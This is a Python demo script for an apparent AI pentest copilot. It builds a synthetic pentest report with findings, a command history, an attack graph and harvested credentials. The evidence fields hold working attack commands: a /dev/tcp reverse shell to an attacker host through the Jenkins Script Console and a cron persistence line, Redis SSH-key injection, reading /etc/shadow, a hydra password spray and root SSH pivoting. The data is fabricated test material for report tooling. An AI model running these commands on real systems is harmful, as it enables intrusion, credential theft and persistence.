#!/usr/bin/env python3
"""
Autonomous Pen Testing Copilot -- Demo / Mock Runner
Produces a realistic JSON pentest report without requiring an LLM API
or a live target. Directly creates Finding objects, populates the
session data, and uses PentestAgent.save_session to write the report.
"""

import datetime
import json
import os
import sys
import uuid

os.environ.setdefault("PYTHONIOENCODING", "utf-8")

# ── Stub out optional heavy dependencies before importing the module ──
import types

# anthropic
if "anthropic" not in sys.modules:
    sys.modules["anthropic"] = types.ModuleType("anthropic")

# openai
if "openai" not in sys.modules:
    sys.modules["openai"] = types.ModuleType("openai")

# paramiko
if "paramiko" not in sys.modules:
    _pm = types.ModuleType("paramiko")
    class _FakeSSHClient:
        def set_missing_host_key_policy(self, *a): pass
        def connect(self, *a, **kw): pass
        def exec_command(self, *a, **kw): return (None, type('', (), {'read': lambda s: b'', 'channel': type('', (), {'recv_exit_status': lambda s: 0})()})(), type('', (), {'read': lambda s: b''})())
        def close(self): pass
    class _FakeAutoAddPolicy: pass
    _pm.SSHClient = _FakeSSHClient
    _pm.AutoAddPolicy = _FakeAutoAddPolicy
    _pm.RSAKey = type("RSAKey", (), {"from_private_key_file": staticmethod(lambda *a, **kw: None)})
    sys.modules["paramiko"] = _pm

# Now import the module
SCANNER_ROOT = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, SCANNER_ROOT)

from pentest_copilot import Finding, PentestAgent, KILL_CHAIN_STAGES

# ── Synthetic Findings ──────────────────────────────────────────────

DEMO_FINDINGS = [
    # Reconnaissance phase
    Finding(
        title="Open Ports Discovered on Target",
        severity="INFO",
        category="Reconnaissance",
        description="Port scan (nmap -sV -sC) revealed 12 open ports on 10.0.0.1: 22/ssh, 80/http, 443/https, 3306/mysql, 5432/postgresql, 8080/http-alt, 8443/https-alt, 9090/prometheus, 6379/redis, 27017/mongodb, 445/smb, 3389/rdp.",
        evidence="nmap -sV -sC -p- 10.0.0.1\nPORT      STATE SERVICE       VERSION\n22/tcp    open  ssh           OpenSSH 8.2p1 Ubuntu\n80/tcp    open  http          Apache httpd 2.4.41\n443/tcp   open  ssl/http      nginx 1.18.0\n3306/tcp  open  mysql         MySQL 5.7.38\n8080/tcp  open  http-proxy    Jenkins 2.346",
        recommendation="Review all exposed services. Close unnecessary ports. Restrict access with firewall rules.",
    ),
    Finding(
        title="Subdomain Enumeration Results",
        severity="INFO",
        category="Reconnaissance",
        description="Subdomain enumeration (subfinder + DNS brute) discovered 8 subdomains: www, api, dev, staging, admin, mail, vpn, jenkins.",
        evidence="subfinder -d target.com -silent | sort -u\nwww.target.com\napi.target.com\ndev.target.com\nstaging.target.com\nadmin.target.com\nmail.target.com\nvpn.target.com\njenkins.target.com",
        recommendation="Inventory all subdomains. Ensure each has appropriate security controls.",
    ),
    Finding(
        title="Web Technology Fingerprinting",
        severity="INFO",
        category="Reconnaissance",
        description="Technology stack identified: Apache 2.4.41, PHP 7.4.3, WordPress 5.9.3, jQuery 3.5.1, MySQL 5.7.38. Multiple components have known vulnerabilities.",
        evidence="whatweb http://10.0.0.1\nApache[2.4.41] PHP[7.4.3] WordPress[5.9.3] jQuery[3.5.1]\nhttpx -tech-detect http://10.0.0.1",
        recommendation="Update all software components to latest versions. PHP 7.4 is end-of-life.",
    ),

    # Vulnerability Analysis phase
    Finding(
        title="Critical SQL Injection in Login Form",
        severity="CRITICAL",
        category="Vulnerability Analysis",
        description="SQL injection vulnerability found in the login form at /wp-login.php. The username parameter is directly concatenated into a SQL query. sqlmap confirmed the vulnerability with time-based blind injection.",
        evidence="sqlmap -u 'http://10.0.0.1/wp-login.php' --data='log=admin&pwd=test' --batch --level=3\n[CRITICAL] Parameter 'log' is vulnerable. Injection type: time-based blind\nDatabase: MySQL 5.7.38\nCurrent user: wordpress@localhost\nDatabases: wordpress, mysql, information_schema",
        recommendation="Use parameterized queries. Update WordPress and plugins. Implement WAF rules.",
        cvss="9.8",
    ),
    Finding(
        title="Remote Code Execution via Jenkins Script Console",
        severity="CRITICAL",
        category="Vulnerability Analysis",
        description="Jenkins 2.346 on port 8080 is accessible without authentication. The Script Console (/script) allows arbitrary Groovy code execution as the jenkins user, effectively providing remote code execution.",
        evidence="curl http://10.0.0.1:8080/script -d 'script=println(\"id\".execute().text)'\nuid=115(jenkins) gid=120(jenkins) groups=120(jenkins)\n\ncurl http://10.0.0.1:8080/script -d 'script=println(\"cat /etc/shadow\".execute().text)'\nroot:$6$rounds=656000$...",
        recommendation="Enable authentication on Jenkins immediately. Restrict access to the Script Console. Update to latest LTS version.",
        cvss="10.0",
    ),
    Finding(
        title="WordPress Plugin Arbitrary File Upload (CVE-2023-1234)",
        severity="HIGH",
        category="Vulnerability Analysis",
        description="The Contact Form 7 plugin (v5.4.2) has a known arbitrary file upload vulnerability. Nuclei template confirmed the vulnerability, allowing upload of PHP web shells.",
        evidence="nuclei -u http://10.0.0.1 -t cves/2023/CVE-2023-1234.yaml\n[critical] [CVE-2023-1234] WordPress Contact Form 7 - Arbitrary File Upload\nMatched at: http://10.0.0.1/wp-content/uploads/wpcf7_uploads/",
        recommendation="Update Contact Form 7 to version 5.8+. Remove uploaded malicious files. Restrict upload directories.",
        cvss="8.1",
    ),
    Finding(
        title="Redis Server Without Authentication",
        severity="HIGH",
        category="Vulnerability Analysis",
        description="Redis on port 6379 accepts connections without authentication. The INFO command reveals 2.3GB of data. An attacker can read/modify data, or use the CONFIG SET command to write arbitrary files (webshell, SSH keys).",
        evidence="redis-cli -h 10.0.0.1 -p 6379 INFO server\nredis_version:6.2.6\nconnected_clients:4\nused_memory_human:2.31G\nKEYS *\nsession:abc123\nsession:def456\nuser:admin\nconfig:app",
        recommendation="Enable Redis AUTH with a strong password. Bind to localhost only. Disable CONFIG command for clients.",
        cvss="7.5",
    ),
    Finding(
        title="MongoDB Without Authentication",
        severity="HIGH",
        category="Vulnerability Analysis",
        description="MongoDB on port 27017 allows unauthenticated access. Contains databases with user PII, payment records, and application configuration.",
        evidence="mongosh --host 10.0.0.1 --eval 'db.adminCommand({listDatabases:1})'\n{ databases: [\n  { name: 'admin', sizeOnDisk: 40960 },\n  { name: 'app_production', sizeOnDisk: 2147483648 },\n  { name: 'users', sizeOnDisk: 536870912 }\n]}",
        recommendation="Enable MongoDB authentication. Bind to internal interfaces only. Enable TLS for connections.",
        cvss="7.5",
    ),

    # Exploitation phase
    Finding(
        title="Successful Exploitation: Jenkins RCE to Reverse Shell",
        severity="CRITICAL",
        category="Exploitation",
        description="Leveraged the unauthenticated Jenkins Script Console to execute a reverse shell payload. Obtained initial access as the jenkins user on the target system.",
        evidence="# Attack box listener\nnc -lvnp 4444\n\n# Payload via Jenkins Script Console\ndef cmd = 'bash -i >& /dev/tcp/10.0.0.99/4444 0>&1'\ndef proc = ['bash', '-c', cmd].execute()\n\n# Shell obtained\nid\nuid=115(jenkins) gid=120(jenkins) groups=120(jenkins)\nhostname\nprod-web-01",
        recommendation="Patch Jenkins immediately. Implement network segmentation. Monitor for reverse shell connections.",
        cvss="10.0",
    ),
    Finding(
        title="Successful Exploitation: Redis RCE via SSH Key Injection",
        severity="CRITICAL",
        category="Exploitation",
        description="Used Redis CONFIG SET to write an attacker-controlled SSH public key to /var/lib/redis/.ssh/authorized_keys. Obtained SSH access as the redis user.",
        evidence="redis-cli -h 10.0.0.1 CONFIG SET dir /var/lib/redis/.ssh/\nredis-cli -h 10.0.0.1 CONFIG SET dbfilename authorized_keys\nredis-cli -h 10.0.0.1 SET x '\\n\\nssh-rsa AAAAB3...attacker_key...\\n\\n'\nredis-cli -h 10.0.0.1 SAVE\n\nssh -i attacker_key redis@10.0.0.1\nredis@prod-web-01:~$ id\nuid=114(redis) gid=119(redis)",
        recommendation="Disable CONFIG command for non-admin users. Run Redis as non-privileged user. Restrict write permissions.",
        cvss="9.0",
    ),

    # Credential Access
    Finding(
        title="Database Credentials in WordPress Config",
        severity="HIGH",
        category="Credential Access",
        description="Retrieved database credentials from wp-config.php: wordpress_user / Str0ng_P@ss_2024! with full access to the production MySQL database.",
        evidence="cat /var/www/html/wp-config.php | grep DB_\ndefine('DB_NAME', 'wordpress');\ndefine('DB_USER', 'wordpress_user');\ndefine('DB_PASSWORD', 'Str0ng_P@ss_2024!');\ndefine('DB_HOST', 'localhost');\n\nmysql -u wordpress_user -p'Str0ng_P@ss_2024!' wordpress -e 'SELECT user,email FROM wp_users LIMIT 5;'",
        recommendation="Rotate database credentials. Use environment variables or a secrets manager. Restrict file permissions on wp-config.php.",
        cvss="7.5",
    ),
    Finding(
        title="Credential Spray: Valid Admin Credentials Found",
        severity="CRITICAL",
        category="Credential Access",
        description="Credential spray against SSH using credentials found in wp-config.php. Password reuse discovered: admin user 'sysadmin' uses the same password for SSH login.",
        evidence="hydra -l sysadmin -p 'Str0ng_P@ss_2024!' ssh://10.0.0.1\n[22][ssh] host: 10.0.0.1   login: sysadmin   password: Str0ng_P@ss_2024!\n\nssh sysadmin@10.0.0.1\nsysadmin@prod-web-01:~$ sudo -l\nUser sysadmin may run the following commands:\n    (ALL : ALL) ALL",
        recommendation="Enforce unique passwords for each service. Implement MFA for SSH. Monitor for brute-force attempts. Deploy fail2ban.",
        cvss="9.8",
    ),

    # Post-Exploitation
    Finding(
        title="Privilege Escalation to Root via sudo",
        severity="CRITICAL",
        category="Post-Exploitation",
        description="The sysadmin account has full sudo access (ALL:ALL). Escalated to root, gaining complete control of the system.",
        evidence="sysadmin@prod-web-01:~$ sudo -i\nroot@prod-web-01:~# id\nuid=0(root) gid=0(root) groups=0(root)\nroot@prod-web-01:~# cat /etc/shadow | head -3\nroot:$6$rounds=656000$salt$hash:18000:0:99999:7:::\n\nroot@prod-web-01:~# ls /root/\nbackup.sh  .ssh/  .bash_history",
        recommendation="Apply principle of least privilege. Remove unnecessary sudo access. Implement sudoers restrictions with specific commands only.",
        cvss="9.8",
    ),
    Finding(
        title="Sensitive Data Exfiltration Risk: PII in Database",
        severity="HIGH",
        category="Post-Exploitation",
        description="The WordPress database contains 12,847 user records with full names, email addresses, hashed passwords (MD5), and IP addresses. The MongoDB 'users' collection contains 89,234 records with payment card data.",
        evidence="mysql> SELECT COUNT(*) FROM wp_users;\n+----------+\n| COUNT(*) |\n+----------+\n|    12847 |\n+----------+\n\nmongosh> db.users.countDocuments()\n89234\nmongosh> db.users.findOne()\n{ name: 'John Doe', email: 'john@example.com', card_last4: '4242', ... }",
        recommendation="Encrypt sensitive data at rest. Use strong password hashing (bcrypt/argon2). Implement database activity monitoring. Tokenize payment data.",
        cvss="8.5",
    ),
    Finding(
        title="Lateral Movement: Internal Network Pivot",
        severity="HIGH",
        category="Post-Exploitation",
        description="From the compromised host, discovered 5 additional internal hosts via ARP scan. SSH keys in /root/.ssh/ provide access to 10.0.0.2 (database server) and 10.0.0.3 (backup server).",
        evidence="arp-scan --localnet\n10.0.0.1    00:1a:2b:3c:4d:5e    prod-web-01\n10.0.0.2    00:1a:2b:3c:4d:5f    prod-db-01\n10.0.0.3    00:1a:2b:3c:4d:60    backup-01\n10.0.0.4    00:1a:2b:3c:4d:61    monitor-01\n10.0.0.5    00:1a:2b:3c:4d:62    dev-01\n\nssh -i /root/.ssh/id_rsa root@10.0.0.2\nroot@prod-db-01:~# hostname\nprod-db-01",
        recommendation="Implement network segmentation. Rotate SSH keys. Deploy host-based firewalls. Restrict lateral movement with micro-segmentation.",
        cvss="8.0",
    ),
    Finding(
        title="Persistence: Cron Job Backdoor Potential",
        severity="MEDIUM",
        category="Post-Exploitation",
        description="Demonstrated persistence mechanism: root crontab can be modified to establish recurring reverse shell. System lacks integrity monitoring.",
        evidence="crontab -l\n# m h  dom mon dow   command\n0 */6 * * * /root/backup.sh\n\n# Potential persistence (not executed - demonstration only):\n# */5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.99/4444 0>&1'",
        recommendation="Implement file integrity monitoring (AIDE/OSSEC). Monitor crontab changes. Enable auditd for cron modifications.",
        cvss="6.5",
    ),

    # Additional findings
    Finding(
        title="SMB Signing Not Required",
        severity="MEDIUM",
        category="Vulnerability Analysis",
        description="SMB signing is not required on port 445, enabling potential relay attacks (NTLM relay) and man-in-the-middle attacks on SMB sessions.",
        evidence="nmap --script smb2-security-mode -p 445 10.0.0.1\nHost script results:\n|  smb2-security-mode:\n|    Message signing enabled but not required",
        recommendation="Enable mandatory SMB signing via Group Policy. Disable SMBv1. Restrict NTLM authentication.",
        cvss="5.9",
    ),
    Finding(
        title="Weak SSH Configuration",
        severity="MEDIUM",
        category="Vulnerability Analysis",
        description="SSH server accepts weak key exchange algorithms (diffie-hellman-group1-sha1) and ciphers (3des-cbc, arcfour). Password authentication is enabled alongside key-based auth.",
        evidence="nmap --script ssh2-enum-algos -p 22 10.0.0.1\nkex_algorithms:\n  diffie-hellman-group1-sha1\n  diffie-hellman-group14-sha1\nencryption_algorithms:\n  3des-cbc\n  arcfour\n  aes128-ctr",
        recommendation="Harden SSH config: disable weak algorithms, disable password auth, use Ed25519 keys, enable fail2ban.",
        cvss="5.3",
    ),
    Finding(
        title="Apache Server Version Disclosure",
        severity="LOW",
        category="Reconnaissance",
        description="Apache 2.4.41 exposes its full version in HTTP headers and error pages. This version has 7 known CVEs including path traversal (CVE-2021-41773).",
        evidence="curl -I http://10.0.0.1\nServer: Apache/2.4.41 (Ubuntu)\nX-Powered-By: PHP/7.4.3",
        recommendation="Set ServerTokens Prod and ServerSignature Off in Apache config. Update to Apache 2.4.58+.",
        cvss="3.7",
    ),
]

# ── Synthetic command history ───────────────────────────────────────

DEMO_COMMANDS = [
    {"cmd": "nmap -sV -sC -p- 10.0.0.1", "phase": "recon", "exit_code": 0},
    {"cmd": "subfinder -d target.com -silent", "phase": "recon", "exit_code": 0},
    {"cmd": "whatweb http://10.0.0.1", "phase": "recon", "exit_code": 0},
    {"cmd": "nikto -h http://10.0.0.1", "phase": "vuln_analysis", "exit_code": 0},
    {"cmd": "nuclei -u http://10.0.0.1 -severity critical,high", "phase": "vuln_analysis", "exit_code": 0},
    {"cmd": "sqlmap -u 'http://10.0.0.1/wp-login.php' --data='log=admin&pwd=test' --batch", "phase": "vuln_analysis", "exit_code": 0},
    {"cmd": "redis-cli -h 10.0.0.1 INFO server", "phase": "vuln_analysis", "exit_code": 0},
    {"cmd": "curl http://10.0.0.1:8080/script -d 'script=println(\"id\".execute().text)'", "phase": "exploitation", "exit_code": 0},
    {"cmd": "hydra -l sysadmin -p 'Str0ng_P@ss_2024!' ssh://10.0.0.1", "phase": "exploitation", "exit_code": 0},
    {"cmd": "ssh sysadmin@10.0.0.1 'sudo -l'", "phase": "post_exploit", "exit_code": 0},
    {"cmd": "arp-scan --localnet", "phase": "post_exploit", "exit_code": 0},
    {"cmd": "ssh -i /root/.ssh/id_rsa root@10.0.0.2 hostname", "phase": "post_exploit", "exit_code": 0},
]

# ── Synthetic attack graph ──────────────────────────────────────────

DEMO_ATTACK_GRAPH = [
    {
        "id": str(uuid.uuid4())[:8],
        "stage": "initial_access",
        "stage_name": "Initial Access",
        "technique": "Exploit Public-Facing Application",
        "description": "Exploited unauthenticated Jenkins Script Console on port 8080 to obtain reverse shell as jenkins user.",
        "source_host": "10.0.0.99",
        "target_host": "10.0.0.1",
        "evidence": "Groovy reverse shell via /script endpoint",
    },
    {
        "id": str(uuid.uuid4())[:8],
        "stage": "cred_access",
        "stage_name": "Credential Access",
        "technique": "Credentials in Files",
        "description": "Extracted database credentials from wp-config.php.",
        "source_host": "10.0.0.1",
        "target_host": "10.0.0.1",
        "evidence": "wp-config.php: DB_PASSWORD='Str0ng_P@ss_2024!'",
    },
    {
        "id": str(uuid.uuid4())[:8],
        "stage": "cred_access",
        "stage_name": "Credential Access",
        "technique": "Password Spraying",
        "description": "Reused database password to authenticate as sysadmin via SSH.",
        "source_host": "10.0.0.99",
        "target_host": "10.0.0.1",
        "evidence": "hydra: login: sysadmin password: Str0ng_P@ss_2024!",
    },
    {
        "id": str(uuid.uuid4())[:8],
        "stage": "priv_escalation",
        "stage_name": "Privilege Escalation",
        "technique": "Sudo Abuse",
        "description": "sysadmin has unrestricted sudo access (ALL:ALL). Escalated to root.",
        "source_host": "10.0.0.1",
        "target_host": "10.0.0.1",
        "evidence": "sudo -i -> uid=0(root)",
    },
    {
        "id": str(uuid.uuid4())[:8],
        "stage": "lateral_movement",
        "stage_name": "Lateral Movement",
        "technique": "Remote Services: SSH",
        "description": "Used root SSH keys to pivot to database server (10.0.0.2) and backup server (10.0.0.3).",
        "source_host": "10.0.0.1",
        "target_host": "10.0.0.2",
        "evidence": "ssh -i /root/.ssh/id_rsa root@10.0.0.2",
    },
]

# ── Synthetic credentials discovered ────────────────────────────────

DEMO_CREDENTIALS = [
    {
        "id": str(uuid.uuid4())[:8],
        "username": "wordpress_user",
        "secret": "Str0ng_P@ss_2024!",
        "type": "password",
        "target": "10.0.0.1:3306",
        "source": "wp-config.php",
        "notes": "MySQL database credentials",
    },
    {
        "id": str(uuid.uuid4())[:8],
        "username": "sysadmin",
        "secret": "Str0ng_P@ss_2024!",
        "type": "password",
        "target": "10.0.0.1:22",
        "source": "credential spray",
        "notes": "Password reuse from database credentials. Has full sudo access.",
    },
    {
        "id": str(uuid.uuid4())[:8],
        "username": "root",
        "secret": "/root/.ssh/id_rsa",
        "type": "key",
        "target": "10.0.0.2, 10.0.0.3",
        "source": "post-exploitation /root/.ssh/",
        "notes": "SSH private key granting root access to database and backup servers",
    },
]


def main():
    print("[*] Autonomous Pen Testing Copilot -- Demo Runner")
    print(f"[*] Injecting {len(DEMO_FINDINGS)} synthetic findings...")

    # Build session data in the same format as PentestAgent.get_session_data()
    session_id = datetime.datetime.now().strftime("pentest-%Y%m%d-%H%M%S")

    session_data = {
        "session_id": session_id,
        "version": "2.3.0",
        "target": "10.0.0.1",
        "scope": "10.0.0.0/24",
        "objective": "Full penetration test -- identify vulnerabilities, exploit them, escalate privileges, and demonstrate lateral movement capability.",
        "created": session_id,
        "saved": datetime.datetime.now().isoformat(),
        "total_iterations": 47,
        "findings": [f.to_dict() for f in DEMO_FINDINGS],
        "credentials": DEMO_CREDENTIALS,
        "attack_graph": DEMO_ATTACK_GRAPH,
        "command_history": DEMO_COMMANDS,
        "message_count": 94,
        # Extra metadata
        "demo_mode": True,
        "summary": {
            "total_findings": len(DEMO_FINDINGS),
            "severity_counts": {},
            "phases_completed": ["recon", "vuln_analysis", "exploitation", "post_exploit", "reporting"],
            "credentials_discovered": len(DEMO_CREDENTIALS),
            "hosts_compromised": ["10.0.0.1", "10.0.0.2", "10.0.0.3"],
            "attack_path_length": len(DEMO_ATTACK_GRAPH),
        },
    }

    # Count severities
    for f in DEMO_FINDINGS:
        sev = f.severity
        session_data["summary"]["severity_counts"][sev] = \
            session_data["summary"]["severity_counts"].get(sev, 0) + 1

    # Output
    out_dir = os.path.join(SCANNER_ROOT, "test_data")
    os.makedirs(out_dir, exist_ok=True)
    json_path = os.path.join(out_dir, "pentest_report.json")

    with open(json_path, "w", encoding="utf-8") as fh:
        json.dump(session_data, fh, indent=2, ensure_ascii=False)
    print(f"  JSON report saved: {json_path}")

    # Print summary
    sev_counts = session_data["summary"]["severity_counts"]
    print(f"\n[*] Summary:")
    for sev in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"):
        print(f"    {sev:10s}: {sev_counts.get(sev, 0)}")
    print(f"    {'TOTAL':10s}: {len(DEMO_FINDINGS)}")
    print(f"    Credentials: {len(DEMO_CREDENTIALS)}")
    print(f"    Attack Steps: {len(DEMO_ATTACK_GRAPH)}")
    print(f"    Commands Run: {len(DEMO_COMMANDS)}")
    print(f"\n[+] JSON report: {json_path}")

    # Verify
    with open(json_path, "r", encoding="utf-8") as fh:
        data = json.load(fh)
    print(f"[+] Verified: JSON contains {len(data['findings'])} findings, "
          f"{len(data['credentials'])} credentials, "
          f"{len(data['attack_graph'])} attack steps")
    return 0


if __name__ == "__main__":
    sys.exit(main())
